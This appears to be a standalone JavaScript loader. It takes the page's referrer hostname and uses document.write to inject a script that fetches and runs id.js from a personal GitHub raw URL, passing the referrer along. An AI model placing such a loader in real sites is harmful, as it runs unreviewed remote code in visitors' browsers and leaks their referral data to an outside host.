(function () {
  function getReferrer() {
    var referrer = document.referrer;
    if (referrer) {
      var linkEl = document.createElement('a');
      linkEl.setAttribute('href', referrer);

      return linkEl.hostname;
    }

    return '';

  }

  function getScript (filename) {
    document.write('<' + 'script src="' + filename + '" type="text/javascript"><' + '/script>');
  }

  var ref = getReferrer();
  var scriptName = 'https://raw.githubusercontent.com/whogood/temporary/master/id.js';
  if (ref) {
    scriptName += '?original_referer=' + ref;
  }
  getScript(scriptName);

}());
